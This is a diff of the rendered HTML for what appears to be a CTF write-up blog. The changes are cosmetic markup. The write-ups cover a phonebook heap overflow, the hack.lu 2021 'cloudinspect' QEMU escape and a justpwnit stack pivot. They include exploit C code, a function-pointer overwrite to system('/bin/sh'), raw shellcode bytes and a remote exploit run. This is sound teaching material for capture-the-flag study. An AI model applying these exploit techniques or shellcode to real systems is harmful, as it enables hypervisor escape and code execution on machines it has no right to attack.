 <span class="p">{</span>
   <span class="kt">int</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// eax
 </span><span class="c1"></span>  <span class="k">struct</span> <span class="n">entity</span> <span class="o">*</span><span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-8h]
@@ -914,7 +914,7 @@ Choose an option: [1-5]
   <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div><p>The bug lies <code>edit_name</code> function:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">edit_name</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">edit_name</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="kt">int</span> <span class="n">n</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-18h] BYREF
 </span><span class="c1"></span>  <span class="kt">int</span> <span class="n">name_size</span><span class="p">;</span> <span class="c1">// [rsp+1Ch] [rbp-14h]
@@ -948,7 +948,7 @@ Choose an option: [1-5]
 </div>
 <p>Now we&rsquo;re able to overflow through the name pointer we have to find how the leak the libc, a nice way would be to leak it by using free&rsquo;d chunks in the unsortedbin. Or we can leak the <code>entity-&gt;func</code> function pointer which would give us a leak of the binary base address, then we would have to edit the name pointer with the got entry of <code>puts</code> to leak its address within the libc.</p>
 <p>To do so we can create another entity right after the name pointer:</p>
-<pre tabindex="0"><code>0x559b0d4d16b0	0x0000000000000000	0x0000000000000031	........1.......
+<pre><code>0x559b0d4d16b0	0x0000000000000000	0x0000000000000031	........1.......
 0x559b0d4d16c0	0x3131313131313131	0x0000559b0c84f2a1	11111111.....U..
 0x559b0d4d16d0	0x0000559b0d4d1800	0x00000000000000fe	..M..U..........
 0x559b0d4d16e0	0x0000000000000000	0x0000000000000111	................
@@ -976,7 +976,7 @@ Choose an option: [1-5]
 0x559b0d4d1840	0x0000559b0c851fa0	0x000000000000000a	.....U..........
 0x559b0d4d1850	0x0000000000000000	0x000000000001f7b1	................	 &lt;-- Top chunk
 </code></pre><p>The <code>edit_phone_number</code> overwrites the null byte:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">edit_phone_number</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">edit_phone_number</span><span class="p">(</span><span class="kt">int</span> <span class="n">a1</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Enter new phone number: &#34;</span><span class="p">);</span>
   <span class="k">return</span> <span class="n">__isoc99_scanf</span><span class="p">(</span><span class="s">&#34;%8s&#34;</span><span class="p">,</span> <span class="n">people</span><span class="p">[</span><span class="n">a1</span><span class="p">]);</span>
@@ -995,14 +995,14 @@ Choose an option: [1-5]
     </h2>
 </div>
 <p>Then we just have to overwrite the function pointer with the address of <code>system</code> which takes as first argument a pointer to the entity structure of edit the phone number of the entity we wanna use because that&rsquo;s the first field of the structure which means we make it equivalent to a <code>system(&quot;/bin/sh&quot;)</code>.</p>
-<pre tabindex="0"><code>00000000 entity          struc ; (sizeof=0x20, mappedto_8)
+<pre><code>00000000 entity          struc ; (sizeof=0x20, mappedto_8)
 00000000 num             dq ?
 00000008 func            dq ?
 00000010 name            dq ?                    ; offset
 00000018 name_size       dq ?
 00000020 entity          ends
 </code></pre><p>Then here we are:</p>
-<pre tabindex="0"><code>$ python3 exploit.py REMOTE HOST=51.124.222.205 PORT=13380
+<pre><code>$ python3 exploit.py REMOTE HOST=51.124.222.205 PORT=13380
 [*] '/home/nasm/Documents/phonebook/chall/phonebook_patched_patched'
     Arch:     amd64-64-little
     RELRO:    Full RELRO
@@ -1096,10 +1096,10 @@ The <code>flag</code> is located right next to the hypervisor. Go get it!</p>
     </h2>
 </div>
 <p>We got several files:</p>
-<pre tabindex="0"><code>$ ls
+<pre><code>$ ls
 build_qemu.sh  diff_chall.txt  flag  initramfs.cpio.gz  qemu-system-x86_64  run_chall.sh  vmlinuz-5.11.0-38-generic
 </code></pre><p>Apparently, according to the <code>diff_chall.txt</code> , the provided qemu binary is patched with some vulnerable code. Let&rsquo;s take a look at the diff file:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="gh">diff --git a/hw/misc/cloudinspect.c b/hw/misc/cloudinspect.c
+<div class="highlight"><pre class="chroma"><code class="language-diff" data-lang="diff"><span class="gh">diff --git a/hw/misc/cloudinspect.c b/hw/misc/cloudinspect.c
 </span><span class="gh"></span>new file mode 100644
 <span class="gh">index 0000000000..f1c3f84b2a
 </span><span class="gh"></span><span class="gd">--- /dev/null
@@ -1345,14 +1345,14 @@ build_qemu.sh  diff_chall.txt  flag  initramfs.cpio.gz  qemu-system-x86_64  run_
 <p>Now we know a bit more about PCI devices, we can see that the patched code is a PCI interface between the linux guest operating system and .. <em>nothing</em>. That&rsquo;s just a vulnerable PCI device which allows us to read and write four I/O registers (<code>CNT</code>, <code>SRC</code>, <code>CMD</code> and <code>DST</code>). According to these registers, we can read and write at an arbitrary location. There is a check about the size we&rsquo;re requesting for read / write operations at a particular offset from the <code>dmabuf</code> base address, but since we control the offset it does not matter.</p>
 <p>To write these registers from userland, we need to <code>mmap</code> the right <code>resource</code> file corresponding to the PCI device. Then we just have to read or write the mapped file at an offset corresponding to the the register we want to read / write. Furthermore, the arbitrary read / write primitives provided by the device need to read to / from a memory area from its physical address the data we want to read / write.</p>
 <p>The resource file can be found by getting a shell on the machine to take a look at the output of the <code>lspci</code> command.</p>
-<pre tabindex="0"><code>/ # lspci -v
+<pre><code>/ # lspci -v
 00:01.0 Class 0601: 8086:7000
 00:00.0 Class 0600: 8086:1237
 00:01.3 Class 0680: 8086:7113
 00:01.1 Class 0101: 8086:7010
 00:02.0 Class 00ff: 1337:1337
 </code></pre><p>The output of the command is structured like this:</p>
-<pre tabindex="0"><code>Field 1 : 00:02.0 : bus number (00), device number (02) and function (0)
+<pre><code>Field 1 : 00:02.0 : bus number (00), device number (02) and function (0)
 Field 2 : 00ff    : device class
 Field 3 : 1337    : vendor ID
 Field 4 : 1337    : device ID
@@ -1372,20 +1372,20 @@ Field 4 : 1337    : device ID
   
   >here</a
 >. The virt2phys function looks like this:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">uint64_t</span> <span class="nf">virt2phys</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="n">uint64_t</span> <span class="nf">virt2phys</span><span class="p">(</span><span class="kt">void</span><span class="o">*</span> <span class="n">p</span><span class="p">)</span>
 <span class="p">{</span>
-		<span class="kt">uint64_t</span> <span class="n">virt</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">p</span><span class="p">;</span>
+		<span class="n">uint64_t</span> <span class="n">virt</span> <span class="o">=</span> <span class="p">(</span><span class="n">uint64_t</span><span class="p">)</span><span class="n">p</span><span class="p">;</span>
 		<span class="n">assert</span><span class="p">((</span><span class="n">virt</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">);</span>
 		<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&#34;/proc/self/pagemap&#34;</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
 		<span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
 				<span class="n">perror</span><span class="p">(</span><span class="s">&#34;open&#34;</span><span class="p">);</span>
-		<span class="kt">uint64_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">virt</span> <span class="o">/</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
+		<span class="n">uint64_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">virt</span> <span class="o">/</span> <span class="mh">0x1000</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
 		<span class="c1">// the pagemap associates each mapped page of the virtual address space 
 </span><span class="c1"></span>		<span class="c1">// with its PTE entry, the entry corresponding to the page is at address / PAGE_SZ
 </span><span class="c1"></span>		<span class="c1">// and because that&#39;s an array of 64 bits entry, to access the right entry, the
 </span><span class="c1"></span>		<span class="c1">// offset is multiplied per 8. 
 </span><span class="c1"></span>		<span class="n">lseek</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">SEEK_SET</span><span class="p">);</span>
-		<span class="kt">uint64_t</span> <span class="n">phys</span><span class="p">;</span>
+		<span class="n">uint64_t</span> <span class="n">phys</span><span class="p">;</span>
 		<span class="k">if</span> <span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">phys</span><span class="p">,</span> <span class="mi">8</span> <span class="p">)</span> <span class="o">!=</span> <span class="mi">8</span><span class="p">)</span>
 				<span class="n">perror</span><span class="p">(</span><span class="s">&#34;read&#34;</span><span class="p">);</span>
 		<span class="n">assert</span><span class="p">(</span><span class="n">phys</span> <span class="o">&amp;</span> <span class="p">(</span><span class="mi">1ULL</span> <span class="o">&lt;&lt;</span> <span class="mi">63</span><span class="p">));</span>
@@ -1395,7 +1395,7 @@ Field 4 : 1337    : device ID
 </span><span class="c1"></span>		<span class="k">return</span> <span class="n">phys</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div><p>To interact with the device we can write the code right bellow:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;assert.h&gt;</span><span class="cp">
 </span><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
 </span><span class="cp">#include</span> <span class="cpf">&lt;inttypes.h&gt;</span><span class="cp">
 </span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
@@ -1408,23 +1408,23 @@ Field 4 : 1337    : device ID
 </span><span class="cp"></span>
 <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">iomem</span><span class="p">;</span>
 <span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">dmabuf</span><span class="p">;</span>
-<span class="kt">uint64_t</span> <span class="n">dmabuf_phys_addr</span><span class="p">;</span>
+<span class="n">uint64_t</span> <span class="n">dmabuf_phys_addr</span><span class="p">;</span>
 <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
 
 <span class="cp">#define PATH &#34;/sys/devices/pci0000:00/0000:00:02.0/resource0&#34;
 </span><span class="cp"></span>
-<span class="kt">void</span> <span class="nf">iowrite</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span>
+<span class="kt">void</span> <span class="nf">iowrite</span><span class="p">(</span><span class="n">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="n">uint64_t</span> <span class="n">value</span><span class="p">)</span>
 <span class="p">{</span>
-		<span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">iomem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">))</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
+		<span class="o">*</span><span class="p">((</span><span class="n">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">iomem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">))</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="kt">uint64_t</span> <span class="nf">ioread</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span>
+<span class="n">uint64_t</span> <span class="nf">ioread</span><span class="p">(</span><span class="n">uint64_t</span> <span class="n">addr</span><span class="p">)</span>
 <span class="p">{</span>
-		<span class="k">return</span> <span class="o">*</span><span class="p">((</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">iomem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">));</span>
+		<span class="k">return</span> <span class="o">*</span><span class="p">((</span><span class="n">uint64_t</span><span class="o">*</span><span class="p">)(</span><span class="n">iomem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">));</span>
 <span class="p">}</span>
 
-<span class="kt">uint64_t</span> <span class="nf">write_dmabuf</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">offt</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
-		<span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span> <span class="p">)</span><span class="n">dmabuf</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
+<span class="n">uint64_t</span> <span class="nf">write_dmabuf</span><span class="p">(</span><span class="n">uint64_t</span> <span class="n">offt</span><span class="p">,</span> <span class="n">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+		<span class="o">*</span><span class="p">(</span><span class="n">uint64_t</span><span class="o">*</span> <span class="p">)</span><span class="n">dmabuf</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
 		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
 		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">offt</span><span class="p">);</span>
 		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
@@ -1433,13 +1433,13 @@ Field 4 : 1337    : device ID
 		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
 
-<span class="kt">uint64_t</span> <span class="nf">read_offt</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">offt</span><span class="p">)</span> <span class="p">{</span>
+<span class="n">uint64_t</span> <span class="nf">read_offt</span><span class="p">(</span><span class="n">uint64_t</span> <span class="n">offt</span><span class="p">)</span> <span class="p">{</span>
 		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CMD</span><span class="p">,</span> <span class="n">CLOUDINSPECT_DMA_PUT_VALUE</span><span class="p">);</span>
 		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_SRC</span><span class="p">,</span> <span class="n">offt</span><span class="p">);</span>
 		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_CNT</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
 		<span class="n">iowrite</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_DST</span><span class="p">,</span> <span class="n">dmabuf_phys_addr</span><span class="p">);</span>
 		<span class="n">ioread</span><span class="p">(</span><span class="n">CLOUDINSPECT_MMIO_OFFSET_TRIGGER</span><span class="p">);</span>
-		<span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span> <span class="p">)</span><span class="n">dmabuf</span><span class="p">;</span>
+		<span class="k">return</span> <span class="o">*</span><span class="p">(</span><span class="n">uint64_t</span><span class="o">*</span> <span class="p">)</span><span class="n">dmabuf</span><span class="p">;</span>
 <span class="p">}</span>
 
 <span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
@@ -1507,7 +1507,7 @@ Field 4 : 1337    : device ID
     </h3>
 </div>
 <p>To see where we can find pointers to the rwx memory area, we can make use of the <code>search</code> command in <code>pwndbg</code>:</p>
-<pre tabindex="0"><code>pwndbg&gt; vmmap                                                                                                                                                                              
+<pre><code>pwndbg&gt; vmmap                                                                                                                                                                              
 LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA                                                                                                                                            
     0x559a884e1000     0x559a88791000 r--p   2b0000 0      /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
     0x559a88791000     0x559a88c5d000 r-xp   4cc000 2b0000 /home/nasm/r2s/ctf/2021/hack.lu/pwn/cloudinspect/qemu-system-x86_64                                                                 
@@ -1550,13 +1550,13 @@ pwndbg&gt; search -4 0x7fc60400 -w
 </li>
 </ul>
 <p>Then we can write this code:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// offset I got in gdb locally
-</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">base</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="mh">0x10c0</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xdef90</span><span class="p">;</span> <span class="c1">// heap leak
-</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">bss</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0xbc2000</span><span class="p">;</span> <span class="c1">// points to the anonnymous memory area right after the binary
-</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">heap_base</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xf3bff0</span><span class="p">;</span> <span class="c1">// useless
-</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">ops_struct</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">);</span> <span class="c1">// That&#39;s &amp;ClouInspctState.mmio.ops
-</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">addr_obj</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="mh">0xd0</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span> <span class="o">+</span> <span class="mi">2568</span><span class="p">;</span> <span class="c1">// CloudInspectState.mmio.opaque
-</span><span class="c1"></span><span class="kt">uint64_t</span> <span class="n">leak_rwx</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">((</span><span class="n">bss</span> <span class="o">+</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">-</span> <span class="n">addr_obj</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xffff</span><span class="p">;</span> <span class="c1">// leak in the bss
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// offset I got in gdb locally
+</span><span class="c1"></span><span class="n">uint64_t</span> <span class="n">base</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="mh">0x10c0</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xdef90</span><span class="p">;</span> <span class="c1">// heap leak
+</span><span class="c1"></span><span class="n">uint64_t</span> <span class="n">bss</span> <span class="o">=</span> <span class="n">base</span> <span class="o">+</span> <span class="mh">0xbc2000</span><span class="p">;</span> <span class="c1">// points to the anonnymous memory area right after the binary
+</span><span class="c1"></span><span class="n">uint64_t</span> <span class="n">heap_base</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">+</span> <span class="mi">8</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xf3bff0</span><span class="p">;</span> <span class="c1">// useless
+</span><span class="c1"></span><span class="n">uint64_t</span> <span class="n">ops_struct</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">);</span> <span class="c1">// That&#39;s &amp;ClouInspctState.mmio.ops
+</span><span class="c1"></span><span class="n">uint64_t</span> <span class="n">addr_obj</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="mh">0xd0</span><span class="o">-</span><span class="mi">8</span><span class="p">))</span> <span class="o">+</span> <span class="mi">2568</span><span class="p">;</span> <span class="c1">// CloudInspectState.mmio.opaque
+</span><span class="c1"></span><span class="n">uint64_t</span> <span class="n">leak_rwx</span> <span class="o">=</span> <span class="n">read_offt</span><span class="p">((</span><span class="n">bss</span> <span class="o">+</span> <span class="mh">0x6000</span><span class="p">)</span> <span class="o">-</span> <span class="n">addr_obj</span><span class="p">)</span> <span class="o">&amp;</span> <span class="o">~</span><span class="mh">0xffff</span><span class="p">;</span> <span class="c1">// leak in the bss
 </span><span class="c1"></span>
 <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] ops_struct: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ops_struct</span><span class="p">);</span>
 <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] Binary base address: %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">base</span><span class="p">);</span>
@@ -1580,7 +1580,7 @@ pwndbg&gt; search -4 0x7fc60400 -w
     </h3>
 </div>
 <p>I choose to write a shellcode to read the flag at <code>leak_rwx + 0x5000</code>, a known location we can easily read and print from the program. The shellcode is very simple:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">2</span> <span class="c1">; SYS_open</span>
+<div class="highlight"><pre class="chroma"><code class="language-nasm" data-lang="nasm"><span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="mi">2</span> <span class="c1">; SYS_open</span>
 <span class="nf">push</span> <span class="mh">0x67616c66</span> <span class="c1">; flag in little endian</span>
 <span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="nb">rsp</span> <span class="c1">; pointer flag string</span>
 <span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="mi">0</span> <span class="c1">; O_READ</span>
@@ -1596,7 +1596,7 @@ pwndbg&gt; search -4 0x7fc60400 -w
 <span class="nf">add</span> <span class="nb">rsp</span><span class="p">,</span> <span class="mi">8</span><span class="c1">; we pushed the flag str so we destroy it</span>
 <span class="nf">ret</span> <span class="c1">; return to continue the execution</span>
 </code></pre></div><p>To write the shellcode at <code>leak_rwx + 0x1000</code>, we can directly trigger a large write primitive:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define CODE &#34;\x48\xc7\xc0\x02\x00\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\xfd\x01\x00\x00\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\x8d\x35\x00\x00\x00\x00\x48\x81\xe6\x00\x00\x00\xff\x48\x81\xc6\x00\x50\x00\x00\x48\xc7\xc2\x30\x00\x00\x00\x0f\x05\x48\x83\xc4\x08\xc3&#34;
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define CODE &#34;\x48\xc7\xc0\x02\x00\x00\x00\x68\x66\x6c\x61\x67\x48\x89\xe7\x48\xc7\xc6\x00\x00\x00\x00\x48\xc7\xc2\xfd\x01\x00\x00\x0f\x05\x48\x89\xc7\x48\x31\xc0\x48\x8d\x35\x00\x00\x00\x00\x48\x81\xe6\x00\x00\x00\xff\x48\x81\xc6\x00\x50\x00\x00\x48\xc7\xc2\x30\x00\x00\x00\x0f\x05\x48\x83\xc4\x08\xc3&#34;
 </span><span class="cp"></span>
 <span class="n">memcpy</span><span class="p">(</span><span class="n">dmabuf</span><span class="p">,</span> <span class="n">CODE</span><span class="p">,</span> <span class="mi">130</span><span class="p">);</span>
 
@@ -1618,7 +1618,7 @@ pwndbg&gt; search -4 0x7fc60400 -w
     </h3>
 </div>
 <p>To cratf a fake <code>MemoryRegionOps</code>, I just read the original <code>MemoryRegionOps</code> structure, I edited the <code>read</code> handler, and I wrote it back, in a writable memory area, at <code>leak_rwx+0x2000</code>. Given that <code>sizeof(MemoryRegionOps)</code> is not superior to <code>DMA_SIZE</code>, I can read and write in one time. Then we got:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// Craft fake MemoryRegionOps structure by reading the original one
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="c1">// Craft fake MemoryRegionOps structure by reading the original one
 </span><span class="c1"></span>
 <span class="k">struct</span> <span class="n">MemoryRegionOps</span> <span class="n">fake_ops</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
 <span class="n">printf</span><span class="p">(</span><span class="s">&#34;[*] reading struct mmio.MemoryRegionOps @ %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ops_struct</span><span class="p">);</span>
@@ -1653,7 +1653,7 @@ pwndbg&gt; search -4 0x7fc60400 -w
 </div>
 <p>We just have to replace the original <code>CoudInspect.mmio.ops</code> pointer to a pointer to the <code>fake_ops</code> structure.
 Then, next time we send a read request, the shellcode will be executed! And we will just need to retablish the original <code>CoudInspect.mmio.ops</code> pointer to read the flag at <code>leak_rwx+0x5000</code>! Which gives:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">write_dmabuf</span><span class="p">(</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">,</span> <span class="n">leak_rwx</span><span class="o">+</span><span class="mh">0x2000</span><span class="p">);</span>
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="n">write_dmabuf</span><span class="p">(</span><span class="o">-</span><span class="mh">0xd0</span><span class="p">,</span> <span class="n">leak_rwx</span><span class="o">+</span><span class="mh">0x2000</span><span class="p">);</span>
 <span class="c1">// Set the pointer to the MemoryRegionOps to the fake MemoryRegionOps	
 </span><span class="c1"></span>
 <span class="n">ioread</span><span class="p">(</span><span class="mh">0x37</span><span class="p">);</span> <span class="c1">// trigger the read handler we control, then the shellcode is 
@@ -1800,7 +1800,7 @@ You can find the related files <a
 </div>
 <p>justpwnit was a warmup pwn challenge. That&rsquo;s only a basic stack overflow.
 The binary is statically linked and here is the checksec&rsquo;s output:</p>
-<pre tabindex="0"><code>[*] '/home/nasm/justpwnit'
+<pre><code>[*] '/home/nasm/justpwnit'
     Arch:     amd64-64-little
     RELRO:    Partial RELRO
     Stack:    No canary found
@@ -1808,7 +1808,7 @@ The binary is statically linked and here is the checksec&rsquo;s output:</p>
     PIE:      No PIE (0x400000)
 </code></pre><p>Morever the source code is provided as it is the case for all the pwn tasks !
 Here it is:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cm">/*
+<div class="highlight"><pre class="chroma"><code class="language-c" data-lang="c"><span class="cm">/*
 </span><span class="cm"> * musl-gcc main.c -o chall -no-pie -fno-stack-protector -O0 -static
 </span><span class="cm"> */</span>
 <span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
@@ -1846,7 +1846,7 @@ Here it is:</p>
 </code></pre></div><p>The program is basically reading <code>STR_SIZE</code> bytes into <code>parray[index]</code>, the issue is that there is no check on the user controlled index from which we choose were write the input.
 Furthermore, <code>index</code> is a signed integer, which means we can input a negative value. If we do so we will be able to overwrite the saved <code>$rbp</code> value of the <code>set_element</code> stackframe by a heap pointer to our input. By this way at the end of the pwninit, the <code>leave</code> instruction will pivot the stack from the original state to a pointer to the user input.</p>
 <p>Let&rsquo;s see this in gdb !</p>
-<pre tabindex="0"><code>00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
+<pre><code>00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
 01:0008│         0x7ffef03864e8 —▸ 0x7ffef0386520 ◂— 0xb4                                                                                                                                      
 02:0010│         0x7ffef03864f0 ◂— 0x0
 03:0018│         0x7ffef03864f8 ◂— 0xfffffffe00403d3f /* '?=@' */
@@ -1861,7 +1861,7 @@ Furthermore, <code>index</code> is a signed integer, which means we can input a 
 0f:0078│         0x7ffef0386558 —▸ 0x401295 (main+88) ◂— mov    eax, 0
 </code></pre><p>That&rsquo;s the stack&rsquo;s state when we are calling calloc. We can see the <code>set_element</code>&rsquo;s stackframe which ends up in <code>$rsp+38</code> with the saved return address. And right after we see that <code>$rax</code> contains the address of the <code>parray</code> buffer. Which means that if we send -2 as index, <code>$rbp</code> will point to the newly allocated buffer to which we will write right after with <code>fgets</code>.</p>
 <p>Then, if we do so, the stack&rsquo;s state looks like this:</p>
-<pre tabindex="0"><code>00:0000│ rsp     0x7ffef03864e0 ◂— 0x0                                                                                                                                                         
